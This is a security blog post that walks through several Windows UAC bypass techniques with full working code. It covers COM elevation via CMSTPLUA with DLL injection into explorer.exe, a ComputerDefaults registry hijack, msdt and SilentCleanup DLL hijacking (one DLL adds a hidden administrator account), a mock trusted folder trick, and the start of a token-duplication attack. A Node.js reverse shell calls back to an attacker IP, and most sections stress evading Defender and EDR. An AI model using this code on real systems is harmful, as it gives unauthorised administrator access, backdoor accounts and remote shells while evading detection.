---
title:  "Creative UAC Bypass Methods for the Modern Era"
header:
  teaser: "/assets/images/ctfmon_uac.png"
categories:
  - Privilege Escalation
tags:
  - UAC Bypass
  - privilege escalation
  - Windows 11
  - '2024'
  - ctfmon
  - UI Access
  - token manipulation
---

It's been almost a year since my last post, and during that time I have acquired a strong interest in revisiting privilege escalation techniques for the modern era 😸
My goal is always to find code that executes across all Windows versions **AND** bypasses at least Windows Defender. In fact, when I write these blog posts, I test all the code against Windows Defender by default to ensure everything is fully tested and can at least bypass defender before I share my findings.  

Unrelated, but I also added an updated [Discord](https://discord.gg/bqDkEdDrQQ) link on the left panel of my site, in case anyone wants to hop in and say hi.  I've met quite a few of you on Twitter over the years and I've thoroughly enjoyed the conversations that have unfolded since I first joined twitter not that long ago.  Okay, let's dive in to the first UAC bypass method.  

> **Update: 11/16/2025**:

🔒 Bonus Content for Subscribers (Working UAC Bypass for Windows 11 25H2 - CMSTPLUA using PEB Masquerading)
-

> Description: This is a fully working, UAC Bypass for Windows 11 25h2 that once again leverages the CMSTPLUA COM object UAC bypass method.  I've updated the code to help adapt to the changes with the recent 25h2 update.  This should also bypass Windows Defender as a nice added perk.  Enjoy!

🗒️ [Access Code Here](https://ko-fi.com/s/3214218cba) 🗒️

> Teaser Video Below:

<iframe width="560" height="315" src="https://www.youtube.com/embed/MLXg8luDtK0" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>

<hr>


> Update: 3/20/2025: I think someone at Microsoft secretly reads this blog... 😆 I say that because all the methods I posted in fall of last year are now deprecated.  The irony is that I was able to resurrect an old UAC Bypass method that still works if you tweak it a bit!  See below for more info:

> Update 9/28/2025 - IEditionUpgradeManager COM Object UAC Bypass!

Got a new one for you guys 😸  Well, a new take on an old bypass.  This is another COM Object UAC bypass technique which seems to be quite popular right now.  I go over the internals and how it works, analyzing it with Binary Ninja and I walk through the code.  This one still works though you'll have to edit the code some to get it to make EDR happy.  Here's a sneak preview.  If you're a subscriber to the blog you can watch the full length video and get all the code that goes with it! 😸

> Preview Video Below.  Full video at: [https://ko-fi.com/s/ecfb427347](https://ko-fi.com/s/ecfb427347)

<iframe width="560" height="315" src="https://www.youtube.com/embed/e3VlUjM7P4Q" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>

***UAC Bypass #1 - Let's travel back to sometime around 8 years...CMSTPLUA COM interface UAC bypass - (Detection Status: Undetected via Windows Defender and Sophos XDR)***
-

Yes you read that correctly.  This exploit is to my knowledge at least 8 years old and probably even older to be honest.  I can't believe it still works.  This can successfully bypass Windows Defender and Sophos XDR.  I haven't tested any others just yet.   So, how does it work?

**CMSTPLUA** is a **COM class object** identified by CLSID: **{3E5FC7F9-9A51-4367-9063-A120244FBEC7}**

This is an autoelevated COM object and can be found in the registry location below:

**Computer\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\UAC\COMAutoApprovalList**

![image](https://github.com/user-attachments/assets/2c3a00b7-1206-437f-a234-f874d73e51b2)

We will be taking advantage of a COM interface exposed by CMSTPLUA, called ICMLuaUtil.  This interface contains the ShellExec method that allows us to execute our own custom .exe files.  We can access this method and others exposed by the interface after calling **CoCreateInstance** on **CMSTPLUA**.

Using OleView, we can see the COM class object and it's exposed interfaces:

![image](https://github.com/user-attachments/assets/81c0d00e-6f4f-4c6d-a829-88a25d605ecc)

We can also use OleView to see that it is both AutoApproved to bypass UAC and also Elevated:

![image](https://github.com/user-attachments/assets/96addef6-29ab-4ae4-b4e5-e25f82c510d2)

How about the ShellExec function call within the interface?  Yeah, we can see that too if you like 😸  Just fire up Binary Ninja and open `C:\Windows\System32\cmlua.dll`:

![image](https://github.com/user-attachments/assets/1fef1167-3f72-4d68-a9a9-550badd11c01)

Let's bring it all together.  We will be doing the following:

- Call CoCreateInstance(CMSTPLUA CLSID, ..., IID_ICMLuaUtil, ...).

- Receive an ICMLuaUtil* interface pointer.

- Call ICMLuaUtil::ShellExec(...) → results in an elevated process of our choosing

But wait...I thought COM objects need to be ran within a trusted process?  Correct you are!  COM objects are very finnicky/high maintenance 😸 and as I understand it, will not run correctly if they are not being executed within a trusted parent/calling process, such as **explorer.exe**

Most people would opt to do PEB masquerading to make it look as if the executable is running as explorer.exe

I'm not most people, and I like easy solutions. 😆 So, we're going to be injecting a DLL into `explorer.exe` to accomplish the UAC bypass using our COM object of choice and call it a day.  PEB masquerading is hype don't get me wrong!  We can do that next time if you guys like.  For now and for learning purposes, let's just stick with the easy route.  

Now, it's high time we get started on the code we will be using for our DLL we plan to inject into `explorer.exe`!  We will be using Visual Studio per the usual routine.  We will define our CLASS object CLSID and Interface CLSID as can be seen below.  

```cpp

#include "pch.h"
#include <shlobj.h>
#include <atlbase.h>
#include <shellapi.h> 

#pragma comment(lib, "shell32.lib") 

const wchar_t* CLSID_CMSTPLUA = L"{3E5FC7F9-9A51-4367-9063-A120244FBEC7}";
const wchar_t* IID_ICMLuaUtil = L"{6EDD6D74-C007-4E75-B76A-E5740995E24C}";
```

 Next, we need to define the vftable (virtual function table), which is a hidden structure created by the compiler that holds pointers to the virtual functions of a class.  In our case, we are interested in the 7th Function/Method in the list, `ShellExec`.  AddRef() and Release() are considered inherited so we don't have to include them.  So technically we're setting up function/method stubs for SetRasCredentials to ShellExec.  It has to be in order by the way, so you can't just exclude the other methods and just point to ShellExec. 

![image](https://github.com/user-attachments/assets/0aa3b9fe-c6ab-46ba-b367-d2684daf17a2)


```cpp
struct ICMLuaUtil : public IUnknown {
    virtual HRESULT STDMETHODCALLTYPE Method1() = 0;
    virtual HRESULT STDMETHODCALLTYPE Method2() = 0;
    virtual HRESULT STDMETHODCALLTYPE Method3() = 0;
    virtual HRESULT STDMETHODCALLTYPE Method4() = 0;
    virtual HRESULT STDMETHODCALLTYPE Method5() = 0;
    virtual HRESULT STDMETHODCALLTYPE Method6() = 0;
    virtual HRESULT STDMETHODCALLTYPE ShellExec(
        LPCWSTR lpFile,
        LPCWSTR lpParameters,
        LPCWSTR lpDirectory,
        ULONG fMask,
        ULONG nShow) = 0;
};
```

Next, we will declare HRESULT values for error checking and a smart COM pointer to the ICMLuaUtil interface.  Then, we will prepare the moniker string to request elevation through COM:

Moniker String: **"Elevation:Administrator!new:{3E5FC7F9-9A51-4367-9063-A120244FBEC7}"** 

This moniker asks COM to create an elevated instance of the class CMSTPLUA.  We will next do some string to GUID conversions on CLSID and IID.  Then, we need to setup binding options for CoGetObject(), telling it to look for a local server COM object.  Finally, we use `CoGetObject()` with the special elevation moniker to request an elevated COM object implementing ICMLuaUtil.  If successful, it uses the `ShellExec` method of ICMLuaUtil to launch an elevated cmd.exe!

```cpp
int injector() {
    HRESULT hr, coi;
    CComPtr<ICMLuaUtil> spLuaUtil;
    WCHAR moniker[MAX_PATH] = L"Elevation:Administrator!new:";
    wcscat_s(moniker, CLSID_CMSTPLUA);

    CLSID clsid;
    IID iid;

    coi=CoInitialize(NULL);  

    if (FAILED(CLSIDFromString(CLSID_CMSTPLUA, &clsid)) ||
        FAILED(IIDFromString(IID_ICMLuaUtil, &iid))) {
        CoUninitialize();
        return -1;
    }

    BIND_OPTS3 opts;
    ZeroMemory(&opts, sizeof(opts));
    opts.cbStruct = sizeof(opts);
    opts.dwClassContext = CLSCTX_LOCAL_SERVER;

    hr = CoGetObject(moniker, (BIND_OPTS*)&opts, iid, (void**)&spLuaUtil);
    if (SUCCEEDED(hr) && spLuaUtil) {
        spLuaUtil->ShellExec(
            L"C:\\Windows\\System32\\cmd.exe",
            nullptr,
            nullptr,
            SEE_MASK_DEFAULT,
            SW_SHOW);
    }

    CoUninitialize();
    return 0;
}
```

The final code is just boiler plate DLL code that sets up DLLMain and our thread we will be creating to execute the injector() function:

```cpp
DWORD WINAPI ThreadProc(LPVOID lpParameter) {
    HMODULE hModule = (HMODULE)lpParameter;
    injector();
    FreeLibraryAndExitThread(hModule, 0);
    return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD  ul_reason_for_call,
    LPVOID lpReserved
)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        DisableThreadLibraryCalls(hModule);
        CreateThread(nullptr, 0, ThreadProc, hModule, 0, nullptr);
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
```

**Now that we have the DLL code completed, here's some basic DLL injection code to bring it all together:**

```cpp
#include <windows.h>
#include <tlhelp32.h>
#include <iostream>

DWORD GetExplorerPID() {
    DWORD pid = 0;
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) return 0;

    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(PROCESSENTRY32);
    if (Process32First(snapshot, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, L"explorer.exe") == 0) {
                pid = pe.th32ProcessID;
                break;
            }
        } while (Process32Next(snapshot, &pe));
    }

    CloseHandle(snapshot);
    return pid;
}

int main() {
   
    DWORD pid = GetExplorerPID();
    if (!pid) {
        std::wcerr << L"explorer.exe not found!\n";
        return 1;
    }

    HMODULE hKernel32 = GetModuleHandleW(L"kernel32.dll");
    if (!hKernel32) return 1;

    
    auto pLoadLibraryW = (LPTHREAD_START_ROUTINE)GetProcAddress(hKernel32, "LoadLibraryW");
    if (!pLoadLibraryW) return 1;

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) {
        std::wcerr << L"Failed to open explorer.exe\n";
        return 1;
    }

    //update this to your path!!!
    const wchar_t* dllPath = L"C:\\Users\\robbi\\source\\repos\\injected2\\x64\\Debug\\injected2.dll";
    size_t size = (wcslen(dllPath) + 1) * sizeof(wchar_t);

    LPVOID remoteMem = VirtualAllocEx(hProcess, nullptr, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!remoteMem) {
        std::wcerr << L"VirtualAllocEx failed\n";
        CloseHandle(hProcess);
        return 1;
    }

    if (!WriteProcessMemory(hProcess, remoteMem, dllPath, size, nullptr)) {
        std::wcerr << L"WriteProcessMemory failed\n";
        VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }

    // STEP 5: Create remote thread in explorer.exe
    HANDLE hThread = CreateRemoteThread(hProcess, nullptr, 0, pLoadLibraryW, remoteMem, 0, nullptr);
    if (!hThread) {
        std::wcerr << L"CreateRemoteThread failed\n";
    }
    else {
        std::wcout << L"Injection successful!\n";
        CloseHandle(hThread);
    }

    // Clean up
    VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
    CloseHandle(hProcess);
    return 0;
}
```

Compile and run that, and you'll be greeted with your elevated command prompt 🙂

![image](https://github.com/user-attachments/assets/119d2c0c-a294-4cc3-aabd-ad322d4a73e2)

This is an incredibly useful UAC bypass technique and fun to learn too!  It doesn't work on ALWAYS notify UAC setting, but otherwise it should work in all other use cases.
thanks and now on to the easier UAC bypass methods in the next sections :)

As always, full source code can be found in my github repo:

[Source Code](https://github.com/g3tsyst3m/CodefromBlog/tree/main/2024-10-16-Creative%20UAC%20Bypass%20Methods%20for%20the%20Modern%20Era/CSMTP%20COM%20interface%20UAC%20Bypass)

🔒 Bonus Content for Subscribers (Using PEB Masquerading to elevate our cmd.exe using CMSTPLUA COM object UAC Bypass!)
-

> Description: This supplements the COM Object UAC bypass method we learned about today with the PEB masquerading technique.  This time, no DLL injection will be required and we make our process look like it's running as explorer.exe

🗒️ [Access Code Here](https://ko-fi.com/s/1d5e78a48a) 🗒️

<hr>

🔒 Bonus Content for Subscribers (COM objects - A Deeper exploration)
-

> Description: This is a deeper investigation into COM objects prompted by a curious reader of my blog. This supplements the COM Object UAC bypass method I write about on by UAC bypasses for the modern era post.

🗒️ [Access Writeup Here](https://ko-fi.com/s/4bde51ae7b) 🗒️

<hr>


***UAC Bypass #2 - Revisiting an old technique! (Detection Status: Undetected via Windows Defender)***
-

We're going to be revisiting a tried and true UAC Bypass method that still works just fine as of writing this post, 3/20/2025.  (Microsoft if you're reading this I'm on to you!)  I thought to myself,"Windows Defender can't be blocking all these classic UAC bypass methods."  Sure enough, their filters aren't that impressive.  We're going to be working with the `ComputerDefaults.exe` executable in the `C:\Windows\System32` directory.  Here's how it works:

```powershell
New-Item "HKCU:\software\classes\ms-settings\shell\open\command" -Force
New-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value "" -Force
Set-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "(default)" -Value "[yourexecutable or command]" -Force
Start-Process "C:\Windows\System32\ComputerDefaults.exe"
```

This parameter is what Windows Defender scrutinizes the most: `-Value "[yourexecutable or command]"`

If you do: `-Value "notepad"`, Defender is super chill and loves you.  

If you do: `-Value "cmd"`...

![image](https://github.com/user-attachments/assets/708e3c65-cbe9-48dd-bd80-f032d4cb840d)

How about: `-Value "C:\Users\Public\something.exe"`...

![image](https://i.ytimg.com/vi/3CqCq5RtrJo/hq720.jpg?sqp=-oaymwEhCK4FEIIDSFryq4qpAxMIARUAAAAAGAElAADIQj0AgKJD&rs=AOn4CLAqFuuJ8vitOjfCsrPgPFKUxxhiYQ)

So...What if we do.... `-Value "../../myfolder/barney.exe"`

![image](https://github.com/user-attachments/assets/a10b248b-f5af-424b-a042-f8ba2439201a)

![image](https://media0.giphy.com/media/5y8sRBYSWWb16/giphy.gif?cid=6c09b9522xxdays2x4v6zjs6o5y3oejjfsd40rac1du7g9j4&ep=v1_gifs_search&rid=giphy.gif&ct=g)

It's as simple as that my friends.  Don't include Drive letters, Don't include popular payload locations like `c:\users\public` and `c:\temp`.  Just go with the old school ..\\..\\ routine and avoid all that altogether and convince Defender that you are in the right.  Right?! 😸

Also I should mention, the ../../ goes from c:\windows\system32 -> c:\ root directory.  Just create a folder of your choosing and place your .exe in it.

All that's left now is to issue the final statement: 

`Start-Process "C:\Windows\System32\ComputerDefaults.exe"` and we're off to the races!  Your .exe file you placed in the `Value` parameter will be executed without Defender yelling at you.

I should probably also show you what I did as far as my payload goes.  I kept it really simple.  `barney.exe` is just a simple C++ loader.  This is for demo purposes of course.  In a realistic pentest scenario, you'd be substituting your actual C2 implant in the `Value` field:

```cpp

#include <windows.h>

int main()
{
    WinExec("c:\\users\\public\\n0de.exe c:\\users\\public\\elevationstation.js", 0);
}
```

Compile that and move it to the folder you designated in your powershell `Value` field/parameter.

Next up, I'll explain the Node stuff.  `N0de.exe` is literally the renamed Node.JS binary I downloaded as a portable from the Node.js site.  I always use node for pentest engagements as it's a friendly living off the land binary and seems to remain undetected.  Node then opens this .js file, which is my reverse shell:

```javascript
(function(){
var net = require("net"),
cp = require("child_process"),
sh = cp.spawn("cmd.exe", []);
var client = new net.Socket();
client.connect(4444, "192.168.0.134", function(){
client.pipe(sh.stdin);
sh.stdout.pipe(client);
sh.stderr.pipe(client);
});
return /a/;
})();
```

Bring it all together and you get the following:

![image](https://github.com/user-attachments/assets/c2fa9794-a33a-4b6b-a9c0-b6a7f0b5c7ca)

![image](https://github.com/user-attachments/assets/872b4dcf-94f2-439c-a30c-8df6c75b2101)

Final code:

```powershell
New-Item "HKCU:\software\classes\ms-settings\shell\open\command" -Force
New-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value "" -Force
Set-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "(default)" -Value "../../myfolder/barney.exe" -Force
Start-Process "C:\Windows\System32\ComputerDefaults.exe"
```

And there you have it.  An age old UAC Bypass technique that still works, still bypasses UAC and STILL EVADES DEFENDER!  The irony is it's easier than all the other methods I posted last year.
Think smarter not harder I guess.  Okay, I feel better about this blog post now.  I couldn't sit idly by while folks found this page and were likely immediately disappointed because none of the techniques I shared were still relevent.  Now there's at least one 😙  Until next time!

**Video Proof of Concept:**

<iframe width="560" height="315" src="https://www.youtube.com/embed/s4QYZsq32mo?si=IB74bAqzh7zNgIKC" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>

***UAC Bypass #3 - Using Micrososft's Troubleshooting Tool to elevate to Admin! (Detection Status: Undetected via Windows Defender)***
-

Credit first and foremost goes to Emeric Nasi, who discovered this quite some time ago.  All I did was repurpose it for my own needs and present it in a way that is understandable and accessible to you the reader 😸  His original article on this particular UAC bypass technique can be found here: [https://blog.sevagas.com/?MSDT-DLL-Hijack-UAC-bypass](https://blog.sevagas.com/?MSDT-DLL-Hijack-UAC-bypass)

The affected executable is `c:\windows\syswow64\msdt.exe` and we will be seizing the opportunity to exploit a DLL that is vulnerable to DLL hijacking. The reason for the `syswow64` directory is because the vulnerable DLL is the x86/32 bit version, and it will ultimately be loaded by `C:\WINDOWS\SysWOW64\sdiagnhost.exe` which follows the initial loading of `msdt.exe`.  The DLL in question is: `BluetoothDiagnosticUtil.dll`

In order to pull this off, all we need to do is run the following command: 

`c:\windows\syswow64\msdt.exe -path C:\WINDOWS\diagnostics\index\BluetoothDiagnostic.xml -skip yes`

I'm not going to go into detail as to why it works.  I'd recommend reading Emeric's article to understand how he worked it out.  I can say that like most UAC bypass exploits, the msdt.exe is auto-elevated.  The auto-elevation portion depends on the .xml file though.

We also need our own custom .dll to execute our cmd.exe for demo purposes.  I used the following code for mine (Be sure to set your project to compile this as x86):

![image](https://github.com/user-attachments/assets/66cec1d0-c268-4302-8997-d767a2d3a4c5)

```cpp
#include "pch.h"
#include <iostream>
#include <windows.h>
void executor()
{

        STARTUPINFO si = { sizeof(STARTUPINFO) };
        si.dwFlags = STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_SHOWNORMAL;  // Ensures the console window is visible

        PROCESS_INFORMATION pi;

        if (CreateProcess(
            L"C:\\Windows\\System32\\cmd.exe", // Application path
            NULL,                            // Command line args
            NULL,                            // Process handle not inheritable
            NULL,                            // Thread handle not inheritable
            FALSE,                           // Inherit handles
            CREATE_NEW_CONSOLE,              // Ensures a new console window
            NULL,                            // Use parent's environment
            NULL,                            // Use parent's starting directory
            &si,                             // Pointer to STARTUPINFO
            &pi)                             // Pointer to PROCESS_INFORMATION
            )
        {
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        }
        else
        {
            std::cerr << "Failed to start cmd.exe. Error: " << GetLastError() << std::endl;
        }
    }


BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        executor();
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
```

Once we compile that, be sure to place it in a folder included in your USER ENVIRONMENT **%PATH%** variable of your choosing. I chose `c:\myfolder\BluetoothDiagnosticUtil.dll`

Let's run our full command and see what happens:

`c:\windows\syswow64\msdt.exe -path C:\WINDOWS\diagnostics\index\BluetoothDiagnostic.xml -skip yes`

![image](https://github.com/user-attachments/assets/2085b7c2-dabe-4b8b-82a9-fb466ee77f4d)

First off, we get the elevated msdt.exe:

![image](https://github.com/user-attachments/assets/f8dfe3ca-5099-4621-a7f4-b03aca7a4fb7)

Next, we see our newly spawned cmd.exe!

![image](https://github.com/user-attachments/assets/d27a4ce8-6cb4-4756-9c94-ee9a7e68764e)

And the final picture 😸

![image](https://github.com/user-attachments/assets/bfabeb25-a36e-4adb-aaa0-3fb0a7cfad63)

GAME OVER!  not too bad huh?  also Defender never made a peep.  This bypasses EDR with a breeze.  That's it!

<hr>

> Everything below this line is deprecated as far as anything > Windows 11 22h2.  I'd assume OSes < Windows 11 22H2 are still game 😸

<hr>

**Video Proof of Concept:**

<iframe width="560" height="315" src="https://www.youtube.com/embed/6J2p9Ve3DIE?si=pJyLIygaSSfaipOW" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>

***UAC Bypass Technique #3 - DLL Sideloading<br>(UAC setting - ALWAYS ON)***
-

> ***  REMINDER: This is now deprected as far as Windows 11 >22h2 is concerned as of sometime in early 2025 ***

This one isn't too challenging to pull off, though it proved difficult locating a consistent DLL in use across all Windows 11 versions (home/pro/education/enterprise). I'm talking about the ever famous scheduled task, `SilentCleanup`, which of course runs: `cleanmgr.exe / dismhost.exe`. This scheduled task has been abused time and time again over the years, and somehow it still prevails as a tried and true vector for UAC bypass / privilege escalation to this day.
![image](https://github.com/user-attachments/assets/59d2143f-492c-4454-a041-c450dcac815a)

If we go ahead and run this scheduled task, we'll see we have a stray DLL from `dismhost.exe` desperately looking to be intercepted via a DLL Sideloading attack 🤯  That stray DLL is called: `api-ms-win-core-kernel32-legacy-l1.dll`

![image](https://github.com/user-attachments/assets/92ebb2ad-fec3-480c-8ed0-57667c54a477)

Let's fire up Visual Studio and write some code to load our own custom dll. I went a bit overboard and made sure, if at all possible, to prevent the DLL from getting load locked.
You'll see I add a new user, mocker, and join them to the administrators group.  I also write a text file to the c:\ directory for added confirmation of our new privileges.

```c
#include "pch.h"
#include <windows.h>

#pragma comment (lib, "user32.lib")

DWORD WINAPI MyThread(LPVOID lpParam)
{
    WinExec("cmd.exe /c net user mocker M0ck3d2024 /add && net localgroup administrators mocker /add", 0);
    WinExec("cmd.exe /c echo hey > c:\\heythere.txt", 0);
    return 0;
}


DWORD WINAPI WorkItem(LPVOID lpParam)
{
    MyThread(NULL);
    return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
    switch (fdwReason)
    {
    case DLL_PROCESS_ATTACH:
        DisableThreadLibraryCalls(hinstDLL);  // Avoid unnecessary notifications

        // Use QueueUserWorkItem to safely execute code after the DLL has been loaded
        QueueUserWorkItem(WorkItem, NULL, WT_EXECUTEDEFAULT);

        // Optionally execute additional code here, e.g., WinExec command
        // WinExec("cmd.exe /c net user mocker M0ck3d2024 /add && net localgroup administrators mocker /add", 0);

        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
```

Now, let's compile it and add it into our **USER** environment **PATH** folder of our choosing. I made my own to prove you do **NOT** need a premade PATH folder to use this.  Sometimes DLL sideloading attacks, especially **SYSTEM** processes with DLL sideloading opportunities, require a **PATH** location that's already been created.  If there aren't any **PATH** locations created, you're out of luck.  Not in this case.  This attack vector uses the **USER** path location, which we have full control over as a standard user.

![image](https://github.com/user-attachments/assets/b7582201-e55b-4bb0-86a8-9d25c36f3054)

and here it is after compilation has completed, in my PATH folder of choice:

![image](https://github.com/user-attachments/assets/91e1bb7a-0213-4ed8-946b-7496ad15f297)

Now, let's fire up that scheduled task again and see what happens shall we?! 🤞

![image](https://github.com/user-attachments/assets/f5fba616-3ed2-4228-aa2a-afa5cdefef5f)

It's loaded!  That's no guarantee it worked though...let's check to make sure our new user was created, as well as our text file.  
Sure enough, there's the newly created administrator 😸

![image](https://github.com/user-attachments/assets/6857aef0-68ac-41be-abfd-96952c9ba9ba)

and the text file:

![image](https://github.com/user-attachments/assets/7eab66a9-c43a-4492-914d-1eae20763d02)

OKAY!  we're in business.  **HOWEVER**, there is a caveat to this bypass and the other two I'll be covering...they do **NOT** work with the upcoming `User Account Control Administrator Protection`:

[https://blogs.windows.com/windows-insider/2024/10/02/announcing-windows-11-insider-preview-build-27718-canary-channel/](https://blogs.windows.com/windows-insider/2024/10/02/announcing-windows-11-insider-preview-build-27718-canary-channel/)

Trust me, I tried... 😿  But until then, this particular bypass works even with UAC set to ALWAYS ON.  

***UAC Bypass Technique #4 - Mock Trusted Folders<br>(UAC setting - Don't notify me when I make changes to Windows settings)***
-

> **UPDATE: 3/18/2025 - This no longer appears to work on the latest Windows 11 (v24H2), possibly 23H2 as well.**

This particular technique, just like the last one we discussed, is not anything novel.  It's actually been around for quite some time.  I personally discovered it through reading a Bleeping Computer article last year on it:

[https://www.bleepingcomputer.com/news/security/old-windows-mock-folders-uac-bypass-used-to-drop-malware/
](https://www.bleepingcomputer.com/news/security/old-windows-mock-folders-uac-bypass-used-to-drop-malware/)

It's pretty simple really.  We find an auto-elevate executable in c:\Windows\System32 and force it to load our own custom dll.  The interesting aspect of this particular bypass is that the auto elevated executable can only load a DLL if it's contained within the trusted C:\Windows\System32 folder.  We get around this using the mock trusted folder technique.  In brief, when you create a mock folder, the folder includes a trailing space, for instance: `c:\windows \`

In our case, we need to create `c:\windows \system32\`.  This works, as I understand it, because of the following which I swiped from an excellent Medium writeup by David Wells: [https://medium.com/@CE2Wells](https://medium.com/@CE2Wells)

I edited some of this to reflect the executable we're using in this blog post:

> "When this awkward path is sent to AIS for an elevation request, the path is passed to **GetLongPathNameW**, which converts it back to “**C:\Windows\System32\easinvoker.exe**” (space removed). Perfect! This is now the string that trusted directory checks are performed against (using RtlPrefixUnicodeString) for the rest of the routine. The beauty is that after the trusted directory check is done with this converted path string, it is then freed, and rest of checks (and final elevated execution request) are done with the original executable path name (with the trailing space)" - David Wells

Okay, let's choose our autoexecutable. I'll go with `easinvoker.exe`

![image](https://github.com/user-attachments/assets/4003ee7f-1754-474c-bba6-d386d8a2f558)

Now, we need to take care of a few things first.  We need to make sure to include the proper import(s) for our DLL when we load it using easinvoker.exe
I don't want to have to deal with tons of imported APIs, so I'd like to find a DLL that has just one or two.  We'll use the free WinAPISearch64 program to get the job done!
I'll go with the `netutils.dll` DLL file since it only has the 1 imported API:

![image](https://github.com/user-attachments/assets/a0fc0c77-d7e4-48fa-801d-23aee338ea7d)

Next, I need to understand how that API is laid out.  I'll check it out on Microsoft's site:

![image](https://github.com/user-attachments/assets/f9306112-f7b1-4c1f-aaf7-df25bbca94cd)

![image](https://github.com/user-attachments/assets/2ee4eb1b-fa93-481e-be39-653c7dba4625)

cool, let's put it all together: 

```c
//x86_64-w64-mingw32-gcc netutils.c -shared -o netutils.dll
#include <windows.h>
#include <lm.h>
#include <wtypes.h>

BOOL APIENTRY DllMain (HMODULE hModule, DWORD dwReason, LPVOID lpReserved){
    switch(dwReason){
        case DLL_PROCESS_ATTACH:
            WinExec("cmd.exe", 1); 
            break;
        case DLL_PROCESS_DETACH:
            break;
        case DLL_THREAD_ATTACH:
            break;
        case DLL_THREAD_DETACH:
            break;
    }
    return TRUE;
}
NET_API_STATUS WINAPI NetApiBufferFree(LPVOID Buffer)
{
        Sleep(INFINITE);
        return 1;
}
```

compile it (I sometimes use Debian Linux for DLLs. In this case, I had some weird issues with using Visual Studio so just stuck with mingw)

~$ `x86_64-w64-mingw32-gcc netutils.c -shared -o netutils.dll`

Lastly, put together some crappy code that pulls off the UAC Bypass

```bat
@echo off
cd %USERPROFILE%\Desktop
mkdir "\\?\C:\Windows "
mkdir "\\?\C:\Windows \System32"
copy "c:\windows\system32\easinvoker.exe" "C:\Windows \System32\"
cd c:\temp
copy "netutils.dll" "C:\Windows \System32\"
"C:\Windows \System32\easinvoker.exe"
del /q "C:\Windows \System32\*"
rmdir "C:\Windows \System32\"
rmdir "C:\Windows \"
cd %USERPROFILE%\Desktop
```

and be greeted with a beautiful administrator command prompt 😼

![image](https://github.com/user-attachments/assets/bcf9dd38-c8a3-4e5d-b53c-9c5c55a36920)

and that's it!  

Now, time for the grand finale 🙂  I had the most fun with this one, as it's the most creative and consequently the most difficult to learn and pull off...at least for me personally.  But that's what made it all the more enjoyable to research!  I give you...

***UAC Bypass Technique #5 - UI Access Token Duplication<br>(UAC setting - Don't notify me when I make changes to Windows settings)***
-

> **UPDATE: 3/18/2025 - This seems to have been patched sometime in late Fall, 2024**

Yeah, on it's own `ctfmon` seems pretty bland.  It's not fully elevated, though it is running in HIGH integrity.  So I'll give it that

![image](https://github.com/user-attachments/assets/dbb926c8-6f88-4a20-8e39-f01b60b6046b)

Let's peek around a bit more to see what's up with this intriguing yet lackluster process. Hmm, ever wondered about this when viewing a process in Process Hacker/System Informer?

![image](https://github.com/user-attachments/assets/0f8789c3-fe0b-4a3c-b35b-a36116e3a8f3)

I never really thought much of it.  But then again, others delve much deeper into Windows Internals than I have.  Take James Forshaw for example...keep in mind this was from 2019!!!

[https://www.tiraniddo.dev/2019/02/accessing-access-tokens-for-uiaccess.html](https://www.tiraniddo.dev/2019/02/accessing-access-tokens-for-uiaccess.html)

I'll give you the short end of the matter.  We can duplicate the ctfmon's process token and change the token integrity to the integrity of our current process.  Then, we have Leet powers to do an old trick I used to absolutely LOVE doing back in high school.  Using SendKeys to force elevated programs to do our evil bidding...Mwuahahahahahaa!  Normally, well.. sometime after Windows XP...a standard user was prevented from interacting with an elevated application window.  However, with UIAccess, welcome back to the days of Windows XP and 7, where AV sucks and there are no restrictions...where anything goes!  It's starting to get late so I'd better get to it.  Here's the code:

```c
#include <windows.h>
#include <iostream>
#include <string>

// Helper function to adjust token integrity
bool SetTokenIntegrityLevel(HANDLE hTokenTarget, HANDLE hTokenSource) {
    DWORD dwSize = 0;
    TOKEN_MANDATORY_LABEL* pTILSource = nullptr;

    // Get the integrity level of the current process token
    if (!GetTokenInformation(hTokenSource, TokenIntegrityLevel, nullptr, 0, &dwSize) &&
        GetLastError() != ERROR_INSUFFICIENT_BUFFER) {
